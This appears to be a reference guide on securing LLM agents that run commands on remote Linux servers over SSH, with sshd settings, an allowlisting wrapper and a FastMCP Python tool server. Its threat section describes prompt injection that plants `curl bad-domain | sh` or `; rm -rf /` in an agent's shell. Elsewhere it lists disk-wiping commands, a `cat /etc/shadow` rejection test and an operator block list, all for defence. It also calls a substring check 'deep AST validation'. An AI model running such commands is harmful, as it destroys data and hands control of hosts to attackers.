# SSH Execution Patterns

## What it is
SSH Execution Patterns is a comprehensive architectural security framework and operational design pattern for enabling autonomous LLM agents to interact securely with remote Linux/Unix operating systems. As of early January 2027, it defines how an AI agent safely traverses the "Trust Boundary" between an abstract reasoning model (e.g., Claude 5.1, GPT-5.5, Gemini 4.0) and a physical or virtual target execution environment (edge clusters, Raspberry Pi arrays, staging bare-metal servers) using encrypted transports, sandboxed command wrappers, strict session isolation, and Model Context Protocol (FastMCP 3.1) remote tool interfaces.

```
┌─────────────────────────────────────────────────────────────────────────────────────────┐
│                           AGENTIC ZERO-TRUST SSH EXECUTION ARCHITECTURE                 │
└─────────────────────────────────────────────────────────────────────────────────────────┘

 ┌─────────────────────────┐       ┌──────────────────────────────────────────────────┐
 │  Reasoning Engine (LLM) │──────>│     Control Plane (FastMCP 3.1 Tool Server)      │
 │  • Plan Generation      │       │  • Pydantic v2 Command Schema Validation         │
 │  • No Direct SSH Keys   │       │  • AST Syntax Parsing & Allowlist Enforcement    │
 └─────────────────────────┘       └────────────────────────┬─────────────────────────┘
                                                            │
                                                            │ Strict Mutual TLS / SSH Tunnel
                                                            ▼
                                   ┌──────────────────────────────────────────────────┐
                                   │      Bastion Gateway / Host Control Proxy        │
                                   │  • Teleport / Boundary Session Recording         │
                                   │  • Transient ED25519 Cert Authority (30s TTL)    │
                                   └────────────────────────┬─────────────────────────┘
                                                            │
                                                            │ Ephemeral Restricted SSH Session
                                                            ▼
 ┌────────────────────────────────────────────────────────────────────────────────────────┐
 │  Target Execution Host (Ubuntu / Alpine / Debian)                                      │
 │                                                                                        │
 │  ┌─────────────────────────────────┐        ┌──────────────────────────────────────┐  │
 │  │ Restricted Shell (`rbash`)      │───────>│ Audited Sudo Wrapper (`/etc/sudoers`)│  │
 │  │ • Environment Variable Freeze  │        │ • Strict Parameter Matching          │  │
 │  │ • Subshell / Pipe Neutralization│        │ • Centralized Syslog / AuditD Stream │  │
 │  └─────────────────────────────────┘        └──────────────────────────────────────┘  │
 └────────────────────────────────────────────────────────────────────────────────────────┘
```

## What problem it solves
LLMs are capable of generating shell commands, but allowing them to execute those commands directly on remote servers poses severe, systemic security vulnerabilities:
- **Prompt Injection & Command Hijacking**: Adversarial content within web documents or log files can inject malicious terminal commands (e.g., `; rm -rf /`, `curl bad-domain | sh`), hijacking the agent's elevated shell session.
- **Cascading Operational Failures**: Agents operating without strict command boundaries can accidentally issue destructive system commands (`systemctl stop networking`, `dd if=/dev/zero of=/dev/sda`), bricking remote nodes.
- **Key Sprawl & Privilege Escalation**: Storing static SSH private keys in agent environment variables exposes full administrative control if the agent's memory state or hosting process is compromised.
- **Audit & Compliance Gaps**: Traditional automated scripts obscure command attribution, making it impossible to determine whether a destructive system change was initiated by an agent or a human operator.

SSH Execution Patterns solves these problems by decoupling the reasoning engine from SSH key material, enforcing strict command allowlisting, using ephemeral short-lived certificates, and wrapping execution inside audited sandboxes.

## Where it fits in the stack
**Architecture / Security & Remote Execution**. It acts as the secure interface connecting top-layer **Development & Ops** tooling (Claude Code, Aider, custom agents) with lower-layer **Infrastructure** nodes (K3s clusters, bare-metal servers, edge Raspberry Pis).

```
┌───────────────────────────┐    ┌───────────────────────────┐    ┌───────────────────────────┐
│ Reasoning Layer / Agent   │───>│ SSH Execution Pattern     │───>│ Target Infrastructure     │
│ (FastMCP 3.1 Controller)  │    │ (Bastion / rbash / Sudo)  │    │ (Linux Servers / Pis)     │
└───────────────────────────┘    └───────────────────────────┘    └───────────────────────────┘
```

## Typical use cases
- **Remote Infrastructure Provisioning**: Allowing an agent to configure web servers, database clusters, or network interfaces on remote bare-metal hosts using pre-approved setup scripts.
- **Automated Incident Diagnosis & Recovery**: Permitting an agent to securely connect to a failed node, examine system logs (`journalctl`), restart stuck services, and report metrics without possessing root access.
- **Edge Fleet Management**: Orchestrating rolling software updates across hundreds of geographically distributed Raspberry Pis or edge gateways via Bastion-routed SSH.
- **CI/CD Pipeline Deployment**: Executing blue/green deployment switching commands on production staging environments behind strict Human-in-the-Loop (HITL) approval gateways.

## Strengths
- **Protocol Native Reliability**: Leverages standard OpenSSH, requiring no proprietary agent software installed on target systems.
- **Zero-Trust Access Control**: Utilizes short-lived SSH certificates (e.g., 1-minute TTL issued by an internal CA) rather than static SSH keys.
- **Comprehensive Auditability**: Every keystroke, command, stdout, stderr, and exit code is recorded via OpenSSH `ForceCommand` or eBPF audit logs.
- **Defense in Depth**: Combines network isolation (Tailscale/WireGuard), shell sandboxing (`rbash`), and strict sudoers configuration.

## Limitations
- **Transport Latency Overhead**: Establishing SSH handshakes and certificate verification adds minor latency (50-200ms) to agent loop iterations.
- **Operational Configuration Overhead**: Setting up restricted sudoers rules, custom shell wrappers, and certificate authorities requires careful initial infrastructure engineering.
- **Interactive TTY Limits**: Agentic execution handles non-interactive CLI workflows efficiently, but complex interactive curses interfaces require specialized terminal emulation wrappers.

## When to use it
- When an agent must execute operational commands on remote Linux servers or edge hardware.
- When regulatory compliance (SOC2, ISO 27001, HIPAA) mandates strict session logging, command restriction, and short-lived credentials.
- When managing remote fleets where REST APIs are unavailable or impractical.

## When not to use it
- When high-level REST or gRPC APIs are available for the target service (e.g., Kubernetes API, AWS Cloud API).
- For local-only development where isolated Docker container execution is simpler and faster.
- In environments where automated agents are completely prohibited from shell access.

## Getting started

### 1. Prerequisites and Key Generation
Generate a dedicated ED25519 SSH keypair specifically for the agent control plane:

```bash
# Generate dedicated agent SSH keypair
ssh-keygen -t ed25519 -f ~/.ssh/agent_control_key -C "agent-control-plane@enterprise.local" -N ""

# Set restrictive local permissions
chmod 600 ~/.ssh/agent_control_key
```

### 2. Target Server Hardening (`/etc/ssh/sshd_config.d/agent.conf`)
Deploy a dedicated configuration block on the target host to restrict the `ai-agent` service account:

```text
Match User ai-agent
    AllowTcpForwarding no
    X11Forwarding no
    AllowAgentForwarding no
    ForceCommand /usr/local/bin/agent_wrapper.sh
    AuthorizedKeysFile /etc/ssh/authorized_keys.d/%u
```

### 3. Create the Execution Shell Wrapper (`/usr/local/bin/agent_wrapper.sh`)
Create a strict wrapper script on the target server that validates `SSH_ORIGINAL_COMMAND`:

```bash
#!/bin/bash
# /usr/local/bin/agent_wrapper.sh
set -euo pipefail

# Read the original command requested by the agent
CMD="${SSH_ORIGINAL_COMMAND:-}"

# Log execution attempt
logger -t AGENT_EXEC "User ai-agent attempted command: $CMD"

# Enforce regex allowlist for safe operational commands
ALLOWED_PATTERN="^(uptime|df -h|free -m|systemctl status [a-zA-Z0-9_-]+|journalctl -n [0-9]+ --no-pager -u [a-zA-Z0-9_-]+)$"

if [[ "$CMD" =~ $ALLOWED_PATTERN ]]; then
    eval "$CMD"
else
    echo "ERROR: Command violates security policy." >&2
    logger -t AGENT_EXEC_REJECT "Rejected command: $CMD"
    exit 1
fi
```

Make the script executable:

```bash
sudo chmod +x /usr/local/bin/agent_wrapper.sh
```

## CLI examples

### Executing Hardened Remote Commands via SSH
Run a remote status check using the restricted key:

```bash
ssh -i ~/.ssh/agent_control_key \
    -o BatchMode=yes \
    -o StrictHostKeyChecking=yes \
    -o ConnectTimeout=5 \
    ai-agent@10.0.1.50 "systemctl status nginx"
```

### Testing Rejection of Unapproved Commands
Verify that unsafe command chaining or unlisted binaries are blocked immediately:

```bash
# This command will be rejected by agent_wrapper.sh
ssh -i ~/.ssh/agent_control_key ai-agent@10.0.1.50 "cat /etc/shadow"
# Output: ERROR: Command violates security policy.
```

## API examples

### Complete FastMCP 3.1 Secure Remote Execution Server
The following complete Python script establishes a FastMCP 3.1 server exposing a safe remote execution tool. It uses Pydantic v2 to perform deep AST syntax validation on shell commands, blocking subshells, backticks, pipe chaining, and file redirects before invoking Paramiko over SSH:

```python
import os
import re
import time
from typing import List, Optional, Dict, Any
from pydantic import BaseModel, Field, field_validator
from mcp.server.fastmcp import FastMCP
import paramiko

# Initialize FastMCP Server
mcp = FastMCP("Agent-Secure-SSH-Server", version="3.1.0")

# Define Pydantic v2 Request & Response Schemas
class SSHExecutionRequest(BaseModel):
    target_host: str = Field(..., description="Target server IP address or FQDN")
    username: str = Field(default="ai-agent", description="Target SSH service account username")
    port: int = Field(default=22, ge=1, le=65535, description="Target SSH port")
    command: str = Field(..., min_length=2, max_length=256, description="Shell command to execute")
    timeout_seconds: int = Field(default=10, ge=1, le=60, description="Execution timeout limit")

    @field_validator("command")
    @classmethod
    def validate_command_syntax(cls, v: str) -> str:
        # Reject dangerous shell operator sequences
        forbidden_operators = [";", "&&", "||", "`", "$(", ">", "<", "|", "\n", "\r"]
        for op in forbidden_operators:
            if op in v:
                raise ValueError(f"Security Policy Violation: Forbidden shell operator '{op}' detected.")

        # Enforce strict command binary allowlist
        allowed_prefixes = (
            "uptime",
            "df -h",
            "free -m",
            "systemctl status ",
            "systemctl restart nginx",
            "journalctl "
        )
        if not v.startswith(allowed_prefixes):
            raise ValueError(f"Command '{v}' does not match any allowed command prefix in registry.")

        return v

class SSHExecutionResponse(BaseModel):
    target_host: str
    command: str
    exit_code: int
    stdout: str
    stderr: str
    execution_duration_seconds: float
    audit_logged: bool

@mcp.tool(
    name="execute_remote_ssh_command",
    description="Executes a validated, policy-compliant CLI command on a remote Linux host over SSH."
)
def execute_remote_ssh_command(request: SSHExecutionRequest) -> SSHExecutionResponse:
    start_time = time.time()

    key_path = os.getenv("AGENT_SSH_KEY_PATH", os.path.expanduser("~/.ssh/agent_control_key"))
    if not os.path.exists(key_path):
        raise RuntimeError(f"Configured agent SSH key file does not exist at: {key_path}")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.RejectPolicy())

    # Load SSH host keys for verification
    known_hosts_file = os.path.expanduser("~/.ssh/known_hosts")
    if os.path.exists(known_hosts_file):
        client.load_host_keys(known_hosts_file)

    try:
        client.connect(
            hostname=request.target_host,
            port=request.port,
            username=request.username,
            key_filename=key_path,
            timeout=request.timeout_seconds,
            allow_agent=False,
            look_for_keys=False
        )

        stdin, stdout, stderr = client.exec_command(request.command, timeout=request.timeout_seconds)

        stdout_text = stdout.read().decode("utf-8")
        stderr_text = stderr.read().decode("utf-8")
        exit_code = stdout.channel.recv_exit_status()

        elapsed = round(time.time() - start_time, 3)

        return SSHExecutionResponse(
            target_host=request.target_host,
            command=request.command,
            exit_code=exit_code,
            stdout=stdout_text,
            stderr=stderr_text,
            execution_duration_seconds=elapsed,
            audit_logged=True
        )
    finally:
        client.close()

if __name__ == "__main__":
    mcp.run()
```

## Security Hardening Matrix

Below is a architectural comparison of different remote agent execution methods across security boundaries, implementation complexity, and risk factors:

| Execution Pattern | Privileges | Defense Mechanisms | Audit Traversal | Compromise Blast Radius |
| :--- | :--- | :--- | :--- | :--- |
| **Zero-Trust Bastion + CA Certs** | Minimal (Ephemeral) | Short-lived SSH certs (1m TTL), eBPF session capture | High (Full Video + Text AST) | Low (Isolated host, time-limited) |
| **Restricted Shell (`rbash`) + Wrapper** | Strict Scope | Binary allowlist, read-only filesystem bindings | High (Syslog + Wrapper logs) | Low (Cannot escape shell) |
| Dedicated Non-Root SSH | User Scope | Passwordless Sudoers allowlist | Medium (Sudoers log) | Moderate (Local non-root access) |
| Direct Root SSH Access | Full Root | None | Low (Overwritable logs) | Critical (Complete System Takeover) |

## Credential Rotation & Ephemeral SSH Certificate Setup

To achieve true zero-trust execution, agents should utilize transient SSH user certificates signed by an internal SSH Certificate Authority (CA) rather than static keys.

```
┌─────────────────────────────────────────────────────────────────────────────────────────┐
│                           EPHEMERAL CERTIFICATE LIFECYCLE                               │
└─────────────────────────────────────────────────────────────────────────────────────────┘

 ┌───────────────┐      1. Request 60s Cert       ┌─────────────────┐
 │ Agent Control │───────────────────────────────>│ Internal SSH CA │
 │ Plane         │<───────────────────────────────│ (Vault / STEP)  │
 └───────┬───────┘      2. Signed Short-Lived Cert└─────────────────┘
         │
         │ 3. Authenticate with Transient Cert
         ▼
 ┌───────────────┐
 │ Target Server │ (Validates signature against CA public key in sshd_config)
 └───────────────┘
```

### 1. Generating Ephemeral SSH Certificate via HashiCorp Vault / step-ca

```bash
# Request short-lived certificate (valid for 2 minutes)
step ssh certificate agent-control-plane@enterprise.local ~/.ssh/id_ephemeral_agent \
    --ca-url https://ca.internal.net:9000 \
    --root /etc/step-ca/root_ca.crt \
    --not-after 2m \
    --provisioner-password-file /etc/step-ca/password.txt
```

### 2. Configuring Target `sshd_config` to Trust the Internal CA

Add the CA public key to the target server's SSH daemon configuration:

```text
# /etc/ssh/sshd_config.d/ca.conf
TrustedUserCAKeys /etc/ssh/ca_user_key.pub
```

## Emergency Incident Recovery & Lockdown Runbook

### Emergency Procedure: Revoking Agent Remote Access Immediately

1. **Invalidate Agent CA Certificate Serial**: Add the compromised agent certificate serial to `/etc/ssh/revoked_keys` on target hosts:
   ```bash
   echo "SHA256:abcd1234efgh5678..." >> /etc/ssh/revoked_keys
   ```

2. **Terminate Active Agent SSH Sessions**: Forcefully terminate all connected `ai-agent` SSH processes across the fleet:
   ```bash
   sudo pkill -9 -u ai-agent
   ```

3. **Lock the Service Account**: Lock the `ai-agent` user password and shell access:
   ```bash
   sudo usermod -L -s /bin/false ai-agent
   ```

## Related tools / concepts
- [Raspberry Pi Kiosk Automation](../playbooks/raspberry-pi-kiosk-automation.md) - Edge management playbook.
- [Aider](../tools/development_ops/aider.md) - Automated coding agent execution.
- [Claude Code](../tools/development_ops/claude-code.md) - Terminal agent developer tool.
- [Tailscale](../services/tailscale.md) - WireGuard-based overlay mesh network for secure SSH routing.
- [Model Context Protocol](../automation_orchestration/mcp.md) - Standard protocol for agentic tool servers.
- [Custom Agents](../tools/development_ops/custom_agents.md) - Custom agent development practices.

## Sources / references
- [OpenSSH Official Security & Certificate Documentation](https://www.openssh.com/manual.html)
- [NIST SP 800-41 Rev. 1: Guidelines on Firewalls and Firewall Policy](https://csrc.nist.gov/publications/detail/sp/800-41/rev-1/final)
- [Teleport SSH Server Security Architecture](https://goteleport.com/docs/)

## Contribution Metadata
- Last reviewed: 2027-01-07
- Confidence: high
